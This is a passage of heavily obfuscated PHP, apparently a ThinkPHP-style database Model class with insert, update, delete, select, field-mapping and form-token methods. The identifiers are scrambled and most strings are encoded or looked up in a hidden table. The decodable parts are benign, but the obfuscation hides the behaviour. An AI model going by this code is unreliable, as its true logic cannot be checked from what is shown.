$ÂØ×Òø† = "{$åÓœÏÜ}\151\157\137\146\151\154\145\x20\146\x69\154\145\x73\40\157\156\40\146\x69\x6c\x65\163\56\x66\151\x6c\x65\111\104\x20\75\x20\150\151\163\164\x6f\162\x79\x2e\x66\151\x6c\x65\111\x44"; return $this->alias($´´û­İ[2238])->where($È©³Ü±)->join($ÂØ×Òø†, $´´û­İ[2239])->sum($´´û­İ[79]); } } goto cÎ¡Ù‰– ë; eºî‹ö’: define($_SERVER[Ùæõ‰Ï’][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\157\162\x64\x65\162", "\x61\154\x69\141\x73", "\x68\141\166\151\156\147", "\x67\162\x6f\165\160", "\154\x6f\143\153", "\144\x69\163\x74\151\156\x63\x74", "\141\x75\x74\x6f", "\146\x69\x6c\x74\x65\162", "\166\141\x6c\x69\144\x61\164\145", "\162\x65\x73\165\154\x74", "\x62\151\x6e\144", "\x74\x6f\153\145\x6e"); public function __construct($’‚Ô“×† = '', $Ñ®ä¯õ = '', $Õûôµ· = '') { $òÔ¨Œ… =& $_SERVER[Ùæõ‰Ï’]; $this->_initialize(); if (!empty($’‚Ô“×†)) { if (strpos($’‚Ô“×†, $òÔ¨Œ…[10])) { list($this->dbName, $this->name) = explode($òÔ¨Œ…[10], $’‚Ô“×†); } else { $this->name = $’‚Ô“×†; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ñ®ä¯õ)) { $this->tablePrefix = $òÔ¨Œ…[12]; } elseif ($òÔ¨Œ…[12] != $Ñ®ä¯õ) { $this->tablePrefix = $Ñ®ä¯õ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($òÔ¨Œ…[321]); } $this->db(0, empty($this->connection) ? $Õûôµ· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¡¿„¿¥† =& $_SERVER[Ùæõ‰Ï’]; if (empty($this->fields)) { if (think_config($¡¿„¿¥†[322])) { $¡ùˆ¥ßğ = $this->dbName ? $this->dbName : think_config($¡¿„¿¥†[323]); $¦Óëè Ä = think_var_cache($¡¿„¿¥†[324] . strtolower(get_path_this($¡ùˆ¥ßğ) . $¡¿„¿¥†[10] . $this->name)); if ($¦Óëè Ä) { $àÜÑ°Œò = think_config($¡¿„¿¥†[325]); if (empty($àÜÑ°Œò) || $¦Óëè Ä[$¡¿„¿¥†[326]] == $àÜÑ°Œò) { $this->fields = $¦Óëè Ä; return; } } } $this->flush(); } } public function flush() { $¹®¼Æ™Â =& $_SERVER[Ùæõ‰Ï’]; $this->db->setModel($this->name); $±¡–ıŞµ = $this->db->getFields($this->getTableName()); if (!$±¡–ıŞµ) { return !1; } $this->fields = array_keys($±¡–ıŞµ); $this->fields[$¹®¼Æ™Â[327]] = !1; foreach ($±¡–ıŞµ as $Ìâœñ => $ÔîƒçŒö) { $İ±‘½‘²[$Ìâœñ] = $ÔîƒçŒö[$¹®¼Æ™Â[33]]; if ($ÔîƒçŒö[$¹®¼Æ™Â[39]]) { $this->fields[$¹®¼Æ™Â[328]] = $Ìâœñ; if ($ÔîƒçŒö[$¹®¼Æ™Â[42]]) { $this->fields[$¹®¼Æ™Â[327]] = !0; } } } $this->fields[$¹®¼Æ™Â[329]] = $İ±‘½‘²; if (think_config($¹®¼Æ™Â[325])) { $this->fields[$¹®¼Æ™Â[326]] = think_config($¹®¼Æ™Â[325]); } if (think_config($¹®¼Æ™Â[322])) { $Ë®è“ = $this->dbName ? $this->dbName : think_config($¹®¼Æ™Â[323]); think_var_cache($¹®¼Æ™Â[324] . strtolower(get_path_this($Ë®è“) . $¹®¼Æ™Â[10] . $this->name), $this->fields); } } public function switchModel($¿’åŞèŒ, $ìŸ“…°Ï = array()) { $Ô‡É–Éû =& $_SERVER[Ùæõ‰Ï’]; $Å ø“‹ = ucwords(strtolower($¿’åŞèŒ)) . $Ô‡É–Éû[330]; if (!class_exists($Å ø“‹)) { think_exception($Å ø“‹ . think_lang($Ô‡É–Éû[331])); } $this->_extModel = new $Å ø“‹($this->name); if (!empty($ìŸ“…°Ï)) { foreach ($ìŸ“…°Ï as $æÔü£éÎ) { $this->_extModel->setProperty($æÔü£éÎ, $this->{$æÔü£éÎ}); } } return $this->_extModel; } public function __set($à˜Ç˜ Ÿ, $·Äùöñ) { $this->data[$à˜Ç˜ Ÿ] = $·Äùöñ; } public function __get($ÉË†ÎÚ) { return isset($this->data[$ÉË†ÎÚ]) ? $this->data[$ÉË†ÎÚ] : null; } public function __isset($ùå‰Ö) { return isset($this->data[$ùå‰Ö]); } public function __unset($ü¢çè‚) { unset($this->data[$ü¢çè‚]); } public function __call($ûú¯Æ·ß, $ûâ–üºœ) { $àË¶šï÷ =& $_SERVER[Ùæõ‰Ï’]; if (in_array(strtolower($ûú¯Æ·ß), $this->methods, !0)) { $this->options[strtolower($ûú¯Æ·ß)] = $ûâ–üºœ[0]; return $this; } elseif (in_array(strtolower($ûú¯Æ·ß), array($àË¶šï÷[332], $àË¶šï÷[333], $àË¶šï÷[334], $àË¶šï÷[335], $àË¶šï÷[336]), !0)) { $ŸƒæÈÌ¼ = isset($ûâ–üºœ[0]) ? $ûâ–üºœ[0] : $àË¶šï÷[220]; $ŸƒæÈÌ¼ = $this->db->parseKey($ŸƒæÈÌ¼); return $this->getField(strtoupper($ûú¯Æ·ß) . $àË¶šï÷[337] . $ŸƒæÈÌ¼ . $àË¶šï÷[338] . $ûú¯Æ·ß, $àË¶šï÷[332]); } elseif (strtolower(substr($ûú¯Æ·ß, 0, 5)) == $àË¶šï÷[339]) { $ŸƒæÈÌ¼ = think_parse_name(substr($ûú¯Æ·ß, 5)); $†˜‹•å[$ŸƒæÈÌ¼] = $ûâ–üºœ[0]; return $this->where($†˜‹•å)->find(); } elseif (strtolower(substr($ûú¯Æ·ß, 0, 10)) == $àË¶šï÷[340]) { $ ¹Ãä©æ = think_parse_name(substr($ûú¯Æ·ß, 10)); $†˜‹•å[$ ¹Ãä©æ] = $ûâ–üºœ[0]; return $this->where($†˜‹•å)->getField($ûâ–üºœ[1]); } elseif (isset($this->_scope[$ûú¯Æ·ß])) { return $this->scope($ûú¯Æ·ß, $ûâ–üºœ[0]); } elseif (method_exists($this, $ûú¯Æ·ß)) { array_unshift($ûâ–üºœ, $ûú¯Æ·ß); return call_user_func_array(array($this, $àË¶šï÷[341]), $ûâ–üºœ); } else { return call_user_func_array(array(parent, $ûú¯Æ·ß), $ûâ–üºœ); } } protected function call() { $í©†™«¿ =& $_SERVER[Ùæõ‰Ï’]; $”¾•ñã = func_get_args(); $İäÏ¦Œ = array_shift($”¾•ñã); $Ê½ªäÀë = $İäÏ¦Œ; if (is_array($İäÏ¦Œ)) { $Ê½ªäÀë = $İäÏ¦Œ[1]; $İäÏ¦Œ = $İäÏ¦Œ[0]; } $­†ğ¦æŸ = count($”¾•ñã) - 1; if (isset($”¾•ñã[$­†ğ¦æŸ]) && $”¾•ñã[$­†ğ¦æŸ] === $İäÏ¦Œ) { think_exception(__CLASS__ . $í©†™«¿[4] . $İäÏ¦Œ . think_lang($í©†™«¿[342])); return; } $”¾•ñã[] = $İäÏ¦Œ; if (method_exists($this, $í©†™«¿[343])) { $úƒ¨§ìŒ = call_user_func_array(array($this, $í©†™«¿[344]), array($Ê½ªäÀë, $”¾•ñã)); if (!is_null($úƒ¨§ìŒ) && $úƒ¨§ìŒ !== !1) { return $úƒ¨§ìŒ; } } $¶Ó›ºÚ = call_user_func_array(array($this, $İäÏ¦Œ), $”¾•ñã); if (method_exists($this, $í©†™«¿[345])) { $úƒ¨§ìŒ = call_user_func_array(array($this, $í©†™«¿[346]), array($Ê½ªäÀë, $”¾•ñã, $¶Ó›ºÚ)); if ($úƒ¨§ìŒ) { return $úƒ¨§ìŒ; } } return $¶Ó›ºÚ; } protected function _initialize() { } protected function _facade($øäŒùÃİ) { $á¾ÍğßÂ =& $_SERVER[Ùæõ‰Ï’]; if (!empty($this->fields)) { foreach ($øäŒùÃİ as $‡ûÌ˜ßµ => $êÀšÉ‰¸) { if (is_array($this->fields) && !in_array($‡ûÌ˜ßµ, $this->fields, !0)) { unset($øäŒùÃİ[$‡ûÌ˜ßµ]); } elseif (is_scalar($êÀšÉ‰¸)) { $this->_parseType($øäŒùÃİ, $‡ûÌ˜ßµ); } } } if (!empty($this->options[$á¾ÍğßÂ[347]])) { $øäŒùÃİ = array_map($this->options[$á¾ÍğßÂ[347]], $øäŒùÃİ); unset($this->options[$á¾ÍğßÂ[347]]); } $this->_beforeWrite($øäŒùÃİ); return $øäŒùÃİ; } protected function _beforeWrite(&$Ó²³‰) { } public function add($…ªéÍ‹Ä = '', $“ö‚İ£Ñ = array(), $Ù×Î˜£ò = false) { if (empty($…ªéÍ‹Ä)) { if (!empty($this->data)) { $…ªéÍ‹Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ùæõ‰Ï’][348]); return !1; } } $“ö‚İ£Ñ = $this->_parseOptions($“ö‚İ£Ñ); $…ªéÍ‹Ä = $this->_facade($…ªéÍ‹Ä); if (!1 === $this->_beforeInsert($…ªéÍ‹Ä, $“ö‚İ£Ñ)) { return !1; } $º‰Õ±³± = $this->db->insert($…ªéÍ‹Ä, $“ö‚İ£Ñ, $Ù×Î˜£ò); if (!1 !== $º‰Õ±³±) { $ØÙÍ¶Ìí = $this->getLastInsID(); if ($ØÙÍ¶Ìí) { $…ªéÍ‹Ä[$this->getPk()] = $ØÙÍ¶Ìí; $this->_after_insert($…ªéÍ‹Ä, $“ö‚İ£Ñ); return $ØÙÍ¶Ìí; } $this->_after_insert($…ªéÍ‹Ä, $“ö‚İ£Ñ); } return $º‰Õ±³±; } protected function _beforeInsert(&$¬ö”œè­, $áÕæ‡ì®) { } protected function _after_insert($ÚøÓ¿ëº, $ÅĞİ²Ò„) { } public function addAll($±ÙüÜ‰Ô, $ ÚÂ­– = array(), $ïùÉÓ· = false) { $¡ÜõÒ“¯ =& $_SERVER[Ùæõ‰Ï’]; if (empty($±ÙüÜ‰Ô)) { $this->error = think_lang($¡ÜõÒ“¯[348]); return !1; } $ ÚÂ­– = $this->_parseOptions($ ÚÂ­–); foreach ($±ÙüÜ‰Ô as $‰¹—İÏö => $çßÔ³ãã) { $±ÙüÜ‰Ô[$‰¹—İÏö] = $this->_facade($çßÔ³ãã); } if (method_exists($this->db, $¡ÜõÒ“¯[349])) { $¬Ôª¨ë = $this->db->insertAll($±ÙüÜ‰Ô, $ ÚÂ­–, $ïùÉÓ·); } else { $this->startTrans(); foreach ($±ÙüÜ‰Ô as $‰¹—İÏö => $çßÔ³ãã) { $¬Ôª¨ë = $this->db->insert($çßÔ³ãã, $ ÚÂ­–, $ïùÉÓ·); } $this->commit(); } if (!1 !== $¬Ôª¨ë) { $´°ƒóÚˆ = $this->getLastInsID(); if ($´°ƒóÚˆ) { return $´°ƒóÚˆ; } } return $¬Ôª¨ë; } public function selectAdd($Šª®ê‰İ = '', $Æš²ıÓ¥ = '', $¸Ò‹¾Ë = array()) { $İ±‘ğáÙ =& $_SERVER[Ùæõ‰Ï’]; $¸Ò‹¾Ë = $this->_parseOptions($¸Ò‹¾Ë); if (!1 === ($ù…ñîÃÁ = $this->db->selectInsert($Šª®ê‰İ ? $Šª®ê‰İ : $¸Ò‹¾Ë[$İ±‘ğáÙ[350]], $Æš²ıÓ¥ ? $Æš²ıÓ¥ : $this->getTableName(), $¸Ò‹¾Ë))) { $this->error = think_lang($İ±‘ğáÙ[351]); return !1; } else { return $ù…ñîÃÁ; } } public function save($ĞÍÂ©ç = '', $İ²¶¡â = array()) { $Å±åªÔ° =& $_SERVER[Ùæõ‰Ï’]; if (empty($ĞÍÂ©ç)) { if (!empty($this->data)) { $ĞÍÂ©ç = $this->data; $this->data = array(); } else { $this->error = think_lang($Å±åªÔ°[348]); return !1; } } $ĞÍÂ©ç = $this->_facade($ĞÍÂ©ç); $İ²¶¡â = $this->_parseOptions($İ²¶¡â); $¦„Üé§ = $this->getPk(); if (!isset($İ²¶¡â[$Å±åªÔ°[352]])) { if (isset($ĞÍÂ©ç[$¦„Üé§])) { $–ÒĞ¬è[$¦„Üé§] = $ĞÍÂ©ç[$¦„Üé§]; $İ²¶¡â[$Å±åªÔ°[352]] = $–ÒĞ¬è; unset($ĞÍÂ©ç[$¦„Üé§]); } else { $this->error = think_lang($Å±åªÔ°[351]); return !1; } } if (is_array($İ²¶¡â[$Å±åªÔ°[352]]) && isset($İ²¶¡â[$Å±åªÔ°[352]][$¦„Üé§])) { $‚˜Ú¤ÀĞ = $İ²¶¡â[$Å±åªÔ°[352]][$¦„Üé§]; } if (!1 === $this->_beforeUpdate($ĞÍÂ©ç, $İ²¶¡â)) { return !1; } $±ç×óœŠ = $this->db->update($ĞÍÂ©ç, $İ²¶¡â); if (!1 !== $±ç×óœŠ) { if (isset($‚˜Ú¤ÀĞ)) { $ĞÍÂ©ç[$¦„Üé§] = $‚˜Ú¤ÀĞ; } $this->_afterUpdate($ĞÍÂ©ç, $İ²¶¡â); } return $±ç×óœŠ; } protected function _beforeUpdate(&$ë›’©à§, $®‚Ü’µ) { } protected function _afterUpdate($Ó€È¶ä”, $üúá·’›) { } public function delete($‘ó¯ªœÅ = array()) { $ÖıÃ³£µ =& $_SERVER[Ùæõ‰Ï’]; if (empty($‘ó¯ªœÅ) && empty($this->options[$ÖıÃ³£µ[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $·ÃÖˆä® = $this->getPk(); if (is_numeric($‘ó¯ªœÅ) || is_string($‘ó¯ªœÅ)) { if (strpos($‘ó¯ªœÅ, $ÖıÃ³£µ[50])) { $öşï¬¥[$·ÃÖˆä®] = array($ÖıÃ³£µ[353], $‘ó¯ªœÅ); } else { $öşï¬¥[$·ÃÖˆä®] = $‘ó¯ªœÅ; } $this->options[$ÖıÃ³£µ[352]] = $öşï¬¥; } $‘ó¯ªœÅ = $this->_parseOptions(); if (is_array($‘ó¯ªœÅ[$ÖıÃ³£µ[352]]) && isset($‘ó¯ªœÅ[$ÖıÃ³£µ[352]][$·ÃÖˆä®])) { $ÂÇ»è£ = $‘ó¯ªœÅ[$ÖıÃ³£µ[352]][$·ÃÖˆä®]; } $õºÛŠ†¦ = $this->db->delete($‘ó¯ªœÅ); if (!1 !== $õºÛŠ†¦) { $»‹şìŸ = array(); if (isset($ÂÇ»è£)) { $»‹şìŸ[$·ÃÖˆä®] = $ÂÇ»è£; } $this->_after_delete($»‹şìŸ, $‘ó¯ªœÅ); } return $õºÛŠ†¦; } protected function _after_delete($®ß‚şÈş, $‹‘ôùä) { } public function select($œ¼—–Ó = array()) { $‚ÎëŠ—ı =& $_SERVER[Ùæõ‰Ï’]; if (is_string($œ¼—–Ó) || is_numeric($œ¼—–Ó)) { $» µ™èÕ = $this->getPk(); if (strpos($œ¼—–Ó, $‚ÎëŠ—ı[50])) { $ïê¿Ò™”[$» µ™èÕ] = array($‚ÎëŠ—ı[353], $œ¼—–Ó); } else { $ïê¿Ò™”[$» µ™èÕ] = $œ¼—–Ó; } $this->options[$‚ÎëŠ—ı[352]] = $ïê¿Ò™”; } elseif (!1 === $œ¼—–Ó) { $œ¼—–Ó = $this->_parseOptions(); return $‚ÎëŠ—ı[354] . $this->db->buildSelectSql($œ¼—–Ó) . $‚ÎëŠ—ı[355]; } $œ¼—–Ó = $this->_parseOptions(); $»Ö¸° = $this->db->select($œ¼—–Ó); if (!1 === $»Ö¸°) { return !1; } if (empty($»Ö¸°)) { return null; } $this->_afterSelect($»Ö¸°, $œ¼—–Ó); return $»Ö¸°; } protected function _afterSelect(&$ÎµÛ€ğ, $ì…¿ãŠç) { } public function buildSql($¥ëÑÆ‰á = array()) { $™íÊÍ =& $_SERVER[Ùæõ‰Ï’]; $¥ëÑÆ‰á = $this->_parseOptions($¥ëÑÆ‰á); return $™íÊÍ[354] . $this->db->buildSelectSql($¥ëÑÆ‰á) . $™íÊÍ[355]; } public function optionsValue($³ø„äŸË = null) { if (is_null($³ø„äŸË)) { return $this->options; } elseif (is_array($³ø„äŸË)) { $this->options = array_merge($this->options, $³ø„äŸË); } } protected function _parseOptions($ê¬Ç½ù· = array()) { $ƒÓ˜õï =& $_SERVER[Ùæõ‰Ï’]; if (is_array($ê¬Ç½ù·)) { $ê¬Ç½ù· = array_merge($this->options, $ê¬Ç½ù·); } $this->options = array(); if (!isset($ê¬Ç½ù·[$ƒÓ˜õï[356]])) { $ê¬Ç½ù·[$ƒÓ˜õï[356]] = $this->getTableName(); $¥‘Çù½ = $this->fields; } else { $¥‘Çù½ = $this->getDbFields(); } if (!empty($ê¬Ç½ù·[$ƒÓ˜õï[357]])) { $ê¬Ç½ù·[$ƒÓ˜õï[356]] .= $ƒÓ˜õï[53] . $ê¬Ç½ù·[$ƒÓ˜õï[357]]; } $ê¬Ç½ù·[$ƒÓ˜õï[358]] = $this->name; if (isset($ê¬Ç½ù·[$ƒÓ˜õï[352]]) && is_array($ê¬Ç½ù·[$ƒÓ˜õï[352]]) && !empty($¥‘Çù½) && !isset($ê¬Ç½ù·[$ƒÓ˜õï[359]]) && !isset($ê¬Ç½ù·[$ƒÓ˜õï[356]])) { foreach ($ê¬Ç½ù·[$ƒÓ˜õï[352]] as $ƒñ´¶„¢ => $ª•„åñ²) { $ƒñ´¶„¢ = trim($ƒñ´¶„¢); if (in_array($ƒñ´¶„¢, $¥‘Çù½, !0)) { if (is_scalar($ª•„åñ²)) { $this->_parseType($ê¬Ç½ù·[$ƒÓ˜õï[352]], $ƒñ´¶„¢); } } elseif (!is_numeric($ƒñ´¶„¢) && $ƒÓ˜õï[11] != substr($ƒñ´¶„¢, 0, 1) && !1 === strpos($ƒñ´¶„¢, $ƒÓ˜õï[10]) && !1 === strpos($ƒñ´¶„¢, $ƒÓ˜õï[337]) && !1 === strpos($ƒñ´¶„¢, $ƒÓ˜õï[214]) && !1 === strpos($ƒñ´¶„¢, $ƒÓ˜õï[360])) { unset($ê¬Ç½ù·[$ƒÓ˜õï[352]][$ƒñ´¶„¢]); } } } $this->_options_filter($ê¬Ç½ù·); return $ê¬Ç½ù·; } protected function _options_filter(&$î½ÙëØº) { } protected function _parseType(&$á²â²ïÕ, $é¶†İæÈ) { $€àÎ‹•‘ =& $_SERVER[Ùæõ‰Ï’]; if (empty($this->options[$€àÎ‹•‘[361]][$€àÎ‹•‘[4] . $é¶†İæÈ])) { $Â©Ğş‰„ = strtolower($this->fields[$€àÎ‹•‘[329]][$é¶†İæÈ]); if (!1 !== strpos($Â©Ğş‰„, $€àÎ‹•‘[362])) { } elseif (!1 === strpos($Â©Ğş‰„, $€àÎ‹•‘[363]) && !1 !== strpos($Â©Ğş‰„, $€àÎ‹•‘[364])) { $á²â²ïÕ[$é¶†İæÈ] = intval($á²â²ïÕ[$é¶†İæÈ]); } elseif (!1 !== strpos($Â©Ğş‰„, $€àÎ‹•‘[365]) || !1 !== strpos($Â©Ğş‰„, $€àÎ‹•‘[366])) { $á²â²ïÕ[$é¶†İæÈ] = floatval($á²â²ïÕ[$é¶†İæÈ]); } elseif (!1 !== strpos($Â©Ğş‰„, $€àÎ‹•‘[367])) { $á²â²ïÕ[$é¶†İæÈ] = (bool) $á²â²ïÕ[$é¶†İæÈ]; } } } public function find($À¼¶–¾ = array()) { $×··ã‹ =& $_SERVER[Ùæõ‰Ï’]; if (is_numeric($À¼¶–¾) || is_string($À¼¶–¾)) { $º¼ãŞ¯Ÿ[$this->getPk()] = intval($À¼¶–¾); $this->options[$×··ã‹[352]] = $º¼ãŞ¯Ÿ; } $this->options[$×··ã‹[368]] = 1; $À¼¶–¾ = $this->_parseOptions(); $¾úÏ¾¯ = $this->db->select($À¼¶–¾); if (!1 === $¾úÏ¾¯) { return !1; } if (empty($¾úÏ¾¯)) { return null; } $this->data = $¾úÏ¾¯[0]; $this->_afterFind($this->data, $À¼¶–¾); if (!empty($this->options[$×··ã‹[369]])) { return $this->returnResult($this->data, $this->options[$×··ã‹[369]]); } return $this->data; } protected function _afterFind(&$­Ò™å…ó, $›†ã²Àœ) { } protected function returnResult($¢‚»è, $ÍŞøÏ˜ï = '') { $¾Üó¦¶Û =& $_SERVER[Ùæõ‰Ï’]; if ($ÍŞøÏ˜ï) { if (is_callable($ÍŞøÏ˜ï)) { return call_user_func($ÍŞøÏ˜ï, $¢‚»è); } switch (strtolower($ÍŞøÏ˜ï)) { case $¾Üó¦¶Û[370]: return json_encode($¢‚»è); case $¾Üó¦¶Û[371]: return xml_encode($¢‚»è); } } return $¢‚»è; } public function parseFieldsMap($Æ¸œƒÍà, $µñ‘ø¯ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $·ö¡îí— => $°…ßûû) { if ($µñ‘ø¯ == 1) { if (isset($Æ¸œƒÍà[$°…ßûû])) { $Æ¸œƒÍà[$·ö¡îí—] = $Æ¸œƒÍà[$°…ßûû]; unset($Æ¸œƒÍà[$°…ßûû]); } } else { if (isset($Æ¸œƒÍà[$·ö¡îí—])) { $Æ¸œƒÍà[$°…ßûû] = $Æ¸œƒÍà[$·ö¡îí—]; unset($Æ¸œƒÍà[$·ö¡îí—]); } } } } return $Æ¸œƒÍà; } public function setField($šÃ«²³¢, $ëñ¾€˜ö = '') { if (is_array($šÃ«²³¢)) { $©š’í½í = $šÃ«²³¢; } else { $©š’í½í[$šÃ«²³¢] = $ëñ¾€˜ö; } return $this->save($©š’í½í); } public function setAdd($²†ƒè¨×, $ÔØ‹·Ô’ = 1) { $Ü¥÷¡¬ =& $_SERVER[Ùæõ‰Ï’]; $„Õ”íÌÊ = $²†ƒè¨× . $Ü¥÷¡¬[372] . $ÔØ‹·Ô’; if ($ÔØ‹·Ô’ < 0) { $„Õ”íÌÊ = $²†ƒè¨× . $ÔØ‹·Ô’; } return $this->setField($²†ƒè¨×, array($Ü¥÷¡¬[373], $„Õ”íÌÊ)); } public function getField($¶…Ì€Ğ§, $“õùÍ“Í = null) { $ÀÛ¹ú¢€ =& $_SERVER[Ùæõ‰Ï’]; $‰µç˜•³[$ÀÛ¹ú¢€[350]] = $¶…Ì€Ğ§; $‰µç˜•³ = $this->_parseOptions($‰µç˜•³); $¶…Ì€Ğ§ = trim($¶…Ì€Ğ§); if (strpos($¶…Ì€Ğ§, $ÀÛ¹ú¢€[50])) { if (!isset($‰µç˜•³[$ÀÛ¹ú¢€[368]])) { $‰µç˜•³[$ÀÛ¹ú¢€[368]] = is_numeric($“õùÍ“Í) ? $“õùÍ“Í : $ÀÛ¹ú¢€[12]; } $•ä¢ı¬‚ = $this->db->select($‰µç˜•³); if (!empty($•ä¢ı¬‚)) { $‡‰ù¨ï´ = explode($ÀÛ¹ú¢€[50], $¶…Ì€Ğ§); $¶…Ì€Ğ§ = array_keys($•ä¢ı¬‚[0]); $æâšßõ¢ = array_shift($¶…Ì€Ğ§); $ÎÔØïØ™ = array_shift($¶…Ì€Ğ§); $ëşè•î± = array(); $ÖıÖÆÁŸ = count($‡‰ù¨ï´); foreach ($•ä¢ı¬‚ as $‘¹µìĞ) { $ÅËÊõš˜ = $‘¹µìĞ[$æâšßõ¢]; if (2 == $ÖıÖÆÁŸ) { $ëşè•î±[$ÅËÊõš˜] = $‘¹µìĞ[$ÎÔØïØ™]; } else { $ëşè•î±[$ÅËÊõš˜] = is_string($“õùÍ“Í) ? implode($“õùÍ“Í, $‘¹µìĞ) : $‘¹µìĞ; } } return $ëşè•î±; } } else { if (!0 !== $“õùÍ“Í) { $‰µç˜•³[$ÀÛ¹ú¢€[368]] = is_numeric($“õùÍ“Í) ? $“õùÍ“Í : 1; } if ($“õùÍ“Í === $ÀÛ¹ú¢€[332]) { unset($‰µç˜•³[$ÀÛ¹ú¢€[368]]); } $‘¹µìĞ = $this->db->select($‰µç˜•³); if (!empty($‘¹µìĞ)) { if ($“õùÍ“Í === $ÀÛ¹ú¢€[332]) { return reset($‘¹µìĞ[0]); } if (!0 !== $“õùÍ“Í && 1 == $‰µç˜•³[$ÀÛ¹ú¢€[368]]) { return reset($‘¹µìĞ[0]); } foreach ($‘¹µìĞ as $ûœıÜÔ¶) { $ÈÎÈ”Ôş[] = $ûœıÜÔ¶[$¶…Ì€Ğ§]; } return $ÈÎÈ”Ôş; } } return null; } public function create($†‚ˆıÉ’ = '', $ö€„ö— = '') { $½µÌ”ŒÇ =& $_SERVER[Ùæõ‰Ï’]; if (empty($†‚ˆıÉ’)) { $†‚ˆıÉ’ = $_POST; } elseif (is_object($†‚ˆıÉ’)) { $†‚ˆıÉ’ = get_object_vars($†‚ˆıÉ’); } if (empty($†‚ˆıÉ’) || !is_array($†‚ˆıÉ’)) { $this->error = think_lang($½µÌ”ŒÇ[348]); return !1; } $†‚ˆıÉ’ = $this->parseFieldsMap($†‚ˆıÉ’, 0); $ö€„ö— = $ö€„ö— ? $ö€„ö— : (!empty($†‚ˆıÉ’[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$½µÌ”ŒÇ[350]])) { $‹¯¬Ş—° = $this->options[$½µÌ”ŒÇ[350]]; unset($this->options[$½µÌ”ŒÇ[350]]); } elseif ($ö€„ö— == THINK_MODEL_INSERT && isset($this->insertFields)) { $‹¯¬Ş—° = $this->insertFields; } elseif ($ö€„ö— == THINK_MODEL_UPDATE && isset($this->updateFields)) { $‹¯¬Ş—° = $this->updateFields; } if (isset($‹¯¬Ş—°)) { if (is_string($‹¯¬Ş—°)) { $‹¯¬Ş—° = explode($½µÌ”ŒÇ[50], $‹¯¬Ş—°); } if (think_config($½µÌ”ŒÇ[374])) { $‹¯¬Ş—°[] = think_config($½µÌ”ŒÇ[375]); } foreach ($†‚ˆıÉ’ as $»ô×©ù¦ => $ª çÌÒ) { if (!in_array($»ô×©ù¦, $‹¯¬Ş—°)) { unset($†‚ˆıÉ’[$»ô×©ù¦]); } } } if (!$this->autoValidation($†‚ˆıÉ’, $ö€„ö—)) { return !1; } if (!$this->autoCheckToken($†‚ˆıÉ’)) { $this->error = think_lang($½µÌ”ŒÇ[376]); return !1; } if ($this->autoCheckFields) { $‹¯¬Ş—° = $this->getDbFields(); foreach ($†‚ˆıÉ’ as $»ô×©ù¦ => $ª çÌÒ) { if (!in_array($»ô×©ù¦, $‹¯¬Ş—°)) { unset($†‚ˆıÉ’[$»ô×©ù¦]); } elseif (MAGIC_QUOTES_GPC && is_string($ª çÌÒ)) { $†‚ˆıÉ’[$»ô×©ù¦] = stripslashes($ª çÌÒ); } } } $this->autoOperation($†‚ˆıÉ’, $ö€„ö—); $this->data = $†‚ˆıÉ’; return $†‚ˆıÉ’; } public function autoCheckToken($´‘¥­Çö) { $Ü¥”ÂğÇ =& $_SERVER[Ùæõ‰Ï’]; if (isset($this->options[$Ü¥”ÂğÇ[377]]) && !$this->options[$Ü¥”ÂğÇ[377]]) { return !0; } if (think_config($Ü¥”ÂğÇ[374])) { $”Ò¢±ò§ = think_config($Ü¥”ÂğÇ[375]); if (!isset($´‘¥­Çö[$”Ò¢±ò§]) || Session::get($”Ò¢±ò§)) { return !1; } list($…Í¸ÃÌ, $ìçÑš‰æ) = explode($Ü¥”ÂğÇ[11], $´‘¥­Çö[$”Ò¢±ò§]); if ($ìçÑš‰æ && Session::get($”Ò¢±ò§ . $Ü¥”ÂğÇ[10] . $…Í¸ÃÌ) === $ìçÑš‰æ) { Session::remove($”Ò¢±ò§ . $Ü¥”ÂğÇ[10] . $…Í¸ÃÌ); return !0; } if (think_config($Ü¥”ÂğÇ[378])) { Session::remove($”Ò¢±ò§ . $Ü¥”ÂğÇ[10] . $…Í¸ÃÌ); } return !1; } return !0; } public function regex($ÛúâİÄ¼, $½ÛÀË‡×) { $ì±Â’Ïï =& $_SERVER[Ùæõ‰Ï’]; $Ó² ¼Ù… = array($ì±Â’Ïï[379] => $ì±Â’Ïï[380], $ì±Â’Ïï[381] => $ì±Â’Ïï[382], $ì±Â’Ïï[383] => $ì±Â’Ïï[384], $ì±Â’Ïï[385] => $ì±Â’Ïï[386], $ì±Â’Ïï[387] => $ì±Â’Ïï[388], $ì±Â’Ïï[389] => $ì±Â’Ïï[390], $ì±Â’Ïï[391] => $ì±Â’Ïï[392], $ì±Â’Ïï[366] => $ì±Â’Ïï[393], $ì±Â’Ïï[394] => $ì±Â’Ïï[395]); if (isset($Ó² ¼Ù…[strtolower($½ÛÀË‡×)])) { $½ÛÀË‡× = $Ó² ¼Ù…[strtolower($½ÛÀË‡×)]; } return preg_match($½ÛÀË‡×, $ÛúâİÄ¼) === 1; } private function autoOperation(&$½û£¦úŒ, $Ÿ©á‹ ) { $Û©ƒüı =& $_SERVER[Ùæõ‰Ï’]; if (!empty($this->options[$Û©ƒüı[396]])) { $şã½¢â = $this->options[$Û©ƒüı[396]]; unset($this->options[$Û©ƒüı[396]]); } elseif (!empty($this->_auto)) { $şã½¢â = $this->_auto; } if (isset($şã½¢â)) { foreach ($şã½¢â as $í¯ªÂëô) { if (empty($í¯ªÂëô[2])) { $í¯ªÂëô[2] = THINK_MODEL_INSERT; } if ($Ÿ©á‹  == $í¯ªÂëô[2] || $í¯ªÂëô[2] == THINK_MODEL_BOTH) { switch (trim($í¯ªÂëô[3])) { case $Û©ƒüı[397]: case $Û©ƒüı[398]: $ê¦´åÈÇ = 